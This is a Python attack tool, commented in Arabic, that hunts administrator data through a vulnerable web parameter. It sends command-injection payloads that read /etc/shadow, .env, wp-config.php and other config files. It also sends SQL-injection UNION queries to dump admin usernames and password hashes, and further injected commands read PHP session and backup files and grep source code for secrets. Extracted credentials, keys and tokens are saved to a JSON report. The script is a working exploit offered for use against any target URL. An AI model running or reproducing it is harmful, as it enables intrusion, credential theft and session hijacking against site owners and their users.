#!/usr/bin/env python3
"""
Admin Info Extractor - مستخرج معلومات الأدمن من الثغرات
"""
import requests
import re
import json
import base64

class AdminInfoHunter:
    def __init__(self, target_url, vulnerable_param):
        self.target_url = target_url
        self.param = vulnerable_param
        self.session = requests.Session()
        self.admin_data = {
            'credentials': [],
            'config_files': [],
            'sessions': [],
            'database_info': [],
            'server_info': {}
        }
    
    def hunt_all_admin_info(self):
        """جمع كل معلومات الأدمن"""
        print(f"[*] بدء صيد معلومات الأدمن من: {self.target_url}")
        print("="*60)
        
        # 1. البحث عن ملفات الإعدادات
        self.find_config_files()
        
        # 2. البحث في قاعدة البيانات عن الأدمن
        self.extract_admin_from_db()
        
        # 3. البحث عن جلسات الأدمن
        self.find_admin_sessions()
        
        # 4. جمع معلومات الخادم
        self.collect_server_info()
        
        # 5. البحث عن ملفات احتياطية
        self.find_backup_files()
        
        # 6. تحليل الكود المصدري
        self.analyze_source_code()
        
        # عرض النتائج
        self.generate_admin_report()
    
    def find_config_files(self):
        """البحث عن ملفات الإعدادات"""
        print("\n[1] البحث عن ملفات الإعدادات...")
        
        # قائمة بملفات الإعدادات الشائعة
        config_files = [
            # PHP
            '/var/www/html/config.php',
            '/var/www/html/config/database.php',
            '/var/www/html/.env',
            '/var/www/html/wp-config.php',  # WordPress
            '/var/www/html/app/etc/local.xml',  # Magento
            '/var/www/html/sites/default/settings.php',  # Drupal
            
            # Ruby
            '/var/www/config/database.yml',
            '/var/www/config/secrets.yml',
            '/var/www/.env',
            
            # Python
            '/var/www/settings.py',
            '/var/www/config.py',
            '/var/www/.env',
            
            # عام
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/etc/mysql/my.cnf',
            
            # في المسار الحالي
            'config.php',
            '.env',
            'database.yml',
            'settings.py'
        ]
        
        for config_file in config_files:
            # استخدام Command Injection
            payloads = [
                f';cat {config_file}',
                f'|cat {config_file}',
                f'`cat {config_file}`',
                f'$(cat {config_file})',
                
                # Ruby Template
                f'#{{File.read("{config_file}")}}',
                
                # محاولة مع مسارات نسبية
                f';cat ../{config_file}',
                f';cat ../../{config_file}'
            ]
            
            for payload in payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={self.param: payload},
                        timeout=5
                    )
                    
                    # تحقق مما إذا كان الملف موجوداً
                    indicators = ['<?php', 'define(', 'DB_', 'password', 'username', 'host', 'database']
                    if any(indicator in response.text for indicator in indicators):
                        print(f"  [+] وجد: {config_file}")
                        
                        # استخراج المعلومات الحساسة
                        sensitive_data = self.extract_sensitive_info(response.text)
                        if sensitive_data:
                            self.admin_data['config_files'].append({
                                'file': config_file,
                                'data': sensitive_data
                            })
                        
                        break
                
                except:
                    continue
    
    def extract_admin_from_db(self):
        """استخراج معلومات الأدمن من قاعدة البيانات"""
        print("\n[2] البحث عن بيانات الأدمن في قاعدة البيانات...")
        
        # محاولة اكتشاف نوع قاعدة البيانات أولاً
        db_payloads = {
            'mysql': [
                "' UNION SELECT username,password FROM admins--",
                "' UNION SELECT user_login,user_pass FROM wp_users--",  # WordPress
                "' UNION SELECT name,pass FROM users WHERE status=1--",
                "'; SELECT * FROM admin_users--"
            ],
            'postgresql': [
                "' UNION SELECT username,password FROM admins--",
                "' UNION SELECT usename,passwd FROM pg_shadow--"  # مستخدمين PostgreSQL
            ],
            'sqlite': [
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT * FROM sqlite_master--"  # مخطط قاعدة البيانات
            ]
        }
        
        for db_type, payloads in db_payloads.items():
            print(f"  [-] اختبار {db_type}...")
            
            for payload in payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={self.param: payload},
                        timeout=5
                    )
                    
                    # أنماط بيانات الأدمن
                    admin_patterns = [
                        r'admin', r'administrator', r'adm_', 
                        r'root', r'superuser', r'[a-f0-9]{32}',  # MD5
                        r'[a-f0-9]{40}',  # SHA1
                        r'\$2[aby]\$',  # bcrypt
                    ]
                    
                    for pattern in admin_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            print(f"    [+] وجد بيانات {db_type}: {matches[:3]}...")
                            
                            # استخراج أزواج username/password
                            lines = response.text.split('\n')
                            for line in lines:
                                if 'admin' in line.lower() or '@' in line:
                                    self.admin_data['credentials'].append({
                                        'db_type': db_type,
                                        'data': line.strip()[:200]
                                    })
                            
                            break
                
                except:
                    continue
    
    def find_admin_sessions(self):
        """البحث عن جلسات الأدمن النشطة"""
        print("\n[3] البحث عن جلسات الأدمن...")
        
        # مسارات الجلسات الشائعة
        session_paths = [
            '/tmp/',  # جلسات PHP افتراضية
            '/var/lib/php/sessions/',
            '/tmp/sessions/',
            '/var/www/html/tmp/',
            '/tmp/php_sessions/'
        ]
        
        # البحث عن ملفات الجلسة
        for path in session_paths:
            payload = f';find {path} -name "sess_*" -type f 2>/dev/null | head -5'
            
            try:
                response = self.session.get(
                    self.target_url,
                    params={self.param: payload},
                    timeout=5
                )
                
                if 'sess_' in response.text:
                    print(f"  [+] جلسات في: {path}")
                    
                    # قراءة محتوى الجلسات
                    session_files = response.text.strip().split('\n')
                    for session_file in session_files[:3]:  # أول 3 ملفات فقط
                        if 'sess_' in session_file:
                            payload_read = f';cat {session_file} 2>/dev/null'
                            session_content = self.session.get(
                                self.target_url,
                                params={self.param: payload_read},
                                timeout=5
                            ).text
                            
                            # البحث عن بيانات الأدمن في الجلسة
                            if 'admin' in session_content.lower() or 'user_id' in session_content:
                                self.admin_data['sessions'].append({
                                    'file': session_file,
                                    'content': session_content[:500]
                                })
                                print(f"    [+] جلسة تحتوي بيانات: {session_file}")
            
            except:
                continue
    
    def collect_server_info(self):
        """جمع معلومات الخادم"""
        print("\n[4] جمع معلومات الخادم...")
        
        info_commands = {
            'system': 'uname -a',
            'user': 'whoami',
            'privileges': 'id',
            'path': 'pwd',
            'processes': 'ps aux | head -20',
            'network': 'netstat -tulpn | head -20',
            'disks': 'df -h',
            'memory': 'free -m',
            'web_server': 'apache2 -v 2>/dev/null || nginx -v 2>/dev/null',
            'php_version': 'php -v 2>/dev/null | head -1',
            'mysql_version': 'mysql --version 2>/dev/null',
            'ruby_version': 'ruby -v 2>/dev/null'
        }
        
        for info_type, command in info_commands.items():
            payloads = [
                f';{command}',
                f'`{command}`',
                f'#{{`{command}`}}'  # Ruby template
            ]
            
            for payload in payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={self.param: payload},
                        timeout=5
                    )
                    
                    if response.text.strip():
                        self.admin_data['server_info'][info_type] = response.text[:300]
                        print(f"  [+] {info_type}: {response.text[:50]}...")
                        break
                
                except:
                    continue
    
    def find_backup_files(self):
        """البحث عن ملفات احتياطية"""
        print("\n[5] البحث عن ملفات احتياطية...")
        
        backup_patterns = [
            '*.bak', '*.backup', '*.old', '*.orig',
            'database.sql', 'backup.zip', '*.tar.gz',
            'wp-config.php.bak', 'config.php.save'
        ]
        
        for pattern in backup_patterns:
            payload = f';find /var/www -name "{pattern}" -type f 2>/dev/null | head -5'
            
            try:
                response = self.session.get(
                    self.target_url,
                    params={self.param: payload},
                    timeout=5
                )
                
                if response.text.strip():
                    files = response.text.strip().split('\n')
                    for file in files:
                        if file:
                            print(f"  [+] ملف احتياطي: {file}")
                            
                            # محاولة قراءة الملف
                            payload_read = f';cat {file} 2>/dev/null | head -100'
                            file_content = self.session.get(
                                self.target_url,
                                params={self.param: payload_read},
                                timeout=5
                            ).text
                            
                            if file_content.strip():
                                # البحث عن معلومات حساسة
                                sensitive = self.extract_sensitive_info(file_content)
                                if sensitive:
                                    self.admin_data['config_files'].append({
                                        'file': file,
                                        'type': 'backup',
                                        'data': sensitive
                                    })
            
            except:
                continue
    
    def analyze_source_code(self):
        """تحليل الكود المصدري للبحث عن ثغرات إضافية"""
        print("\n[6] تحليل الكود المصدري...")
        
        # البحث عن ملفات الكود
        code_extensions = ['.php', '.rb', '.py', '.js', '.java']
        
        for ext in code_extensions:
            payload = f';find /var/www -name "*{ext}" -type f 2>/dev/null | head -10'
            
            try:
                response = self.session.get(
                    self.target_url,
                    params={self.param: payload},
                    timeout=5
                )
                
                if response.text.strip():
                    files = response.text.strip().split('\n')
                    for file in files[:3]:  # أول 3 ملفات فقط
                        if file:
                            # البحث عن كلمات رئيسية في الكود
                            payload_grep = f';grep -n -i "password\|admin\|secret\|key\|token" {file} 2>/dev/null | head -10'
                            
                            grep_result = self.session.get(
                                self.target_url,
                                params={self.param: payload_grep},
                                timeout=5
                            ).text
                            
                            if grep_result.strip():
                                print(f"  [+] معلومات في {file}:")
                                lines = grep_result.split('\n')
                                for line in lines[:5]:
                                    if line:
                                        print(f"    {line[:80]}...")
            
            except:
                continue
    
    def extract_sensitive_info(self, text):
        """استخراج المعلومات الحساسة من النص"""
        sensitive_info = {}
        
        # أنماط البحث
        patterns = {
            'passwords': r'(password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
            'usernames': r'(username|user|login)\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
            'emails': r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
            'database': r'(host|database|dbname)\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
            'api_keys': r'(api[_-]?key|secret[_-]?key)\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
            'tokens': r'(token|access[_-]?token)\s*[:=]\s*["\']?([^"\'\s]+)["\']?'
        }
        
        for info_type, pattern in patterns.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                sensitive_info[info_type] = matches[:5]  # أول 5 نتائج فقط
        
        return sensitive_info
    
    def generate_admin_report(self):
        """توليد تقرير بمعلومات الأدمن"""
        print("\n" + "="*60)
        print("📋 تقرير معلومات الأدمن المجمعة")
        print("="*60)
        
        if not any(self.admin_data.values()):
            print("[-] لم يتم العثور على معلومات أدمن")
            return
        
        # 1. بيانات الدخول
        if self.admin_data['credentials']:
            print("\n🔑 بيانات الدخول المكتشفة:")
            for cred in self.admin_data['credentials'][:5]:  # أول 5 فقط
                print(f"  • {cred.get('db_type', 'Unknown')}: {cred['data']}")
        
        # 2. ملفات الإعدادات
        if self.admin_data['config_files']:
            print("\n📁 ملفات الإعدادات الحساسة:")
            for config in self.admin_data['config_files'][:3]:  # أول 3 فقط
                print(f"  • {config['file']}")
                if 'data' in config and config['data']:
                    for info_type, values in config['data'].items():
                        print(f"    - {info_type}: {values[:2]}")  # أول قيمتين فقط
        
        # 3. الجلسات
        if self.admin_data['sessions']:
            print("\n🔄 جلسات نشطة:")
            for session in self.admin_data['sessions'][:2]:  # أول جلستين فقط
                print(f"  • {session['file']}")
                print(f"    {session['content'][:100]}...")
        
        # 4. معلومات الخادم
        if self.admin_data['server_info']:
            print("\n🖥️  معلومات الخادم:")
            for info_type, value in self.admin_data['server_info'].items():
                if value:
                    print(f"  • {info_type}: {value[:80]}...")
        
        # حفظ النتائج في ملف
        self.save_results()
    
    def save_results(self):
        """حفظ النتائج في ملف"""
        filename = f"admin_info_{self.target_url.replace('://', '_').replace('/', '_')}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.admin_data, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 التقرير محفوظ في: {filename}")

# ============ الاستخدام ============
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════╗
    ║   Admin Information Hunter               ║
    ║   صياد معلومات الأدمن من الثغرات         ║
    ╚══════════════════════════════════════════╝
    """)
    
    import sys
    
    if len(sys.argv) < 3:
        print("الاستخدام: python3 admin_hunter.py <URL> <parameter>")
        print("مثال: python3 admin_hunter.py http://site.com/page id")
        print("مثال: python3 admin_hunter.py http://site.com/app page")
        sys.exit(1)
    
    target_url = sys.argv[1]
    vulnerable_param = sys.argv[2]
    
    hunter = AdminInfoHunter(target_url, vulnerable_param)
    hunter.hunt_all_admin_info()